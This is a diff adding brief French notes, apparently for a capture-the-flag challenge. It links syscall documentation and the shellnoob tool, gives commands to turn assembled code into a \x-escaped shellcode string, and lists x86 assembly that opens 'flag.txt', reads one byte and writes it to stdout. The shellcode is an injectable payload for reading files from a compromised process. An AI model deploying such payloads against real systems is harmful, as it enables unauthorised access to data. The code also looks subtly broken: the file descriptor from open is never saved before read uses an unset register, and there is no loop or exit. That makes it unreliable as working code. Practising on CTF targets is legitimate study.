@@ -1,0 +1,41 @@
+
+La doc:
+http://cs.lmu.edu/~ray/notes/linuxsyscalls/
+
+Tools:
+* https://github.com/reyammer/shellnoob
+
+Pour compiler:
+mets ca dans 'shell.c'
+$ as [--32] -o shell shell.c
+$ for i in `objdump -d shell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
+
+_start:                                                                         
+    xor %eax, %eax                                                              
+    xor %ebx, %ebx                                                              
+    xor %ecx, %ecx                                                              
+    xor %edx, %edx                                                              
+    jmp string                                                                  
+one:                                                                            
+    pop %ebx                                                                    
+                                                                                
+open:                                                                           
+    movb    $5, %al                                                             
+    xor %ecx, %ecx                                                              
+    int $0x80                                                                   
+read:                                                                           
+    mov %esi, %ebx                                                              
+    movb    $3, %al                                                             
+    sub $1, %esp                                                                
+    lea (%esp), %ecx                                                            
+    movb    $1, %dl                                                             
+    int $0x80                                                                   
+                                                                                
+write:                                                                          
+    movb    $4, %al                                                             
+    movb    $1, %bl                                                             
+    movb    $1, %dl                                                             
+    int $0x80                                                                   
+string:                                                                         
+    call    one                                                                 
+    .string "flag.txt"
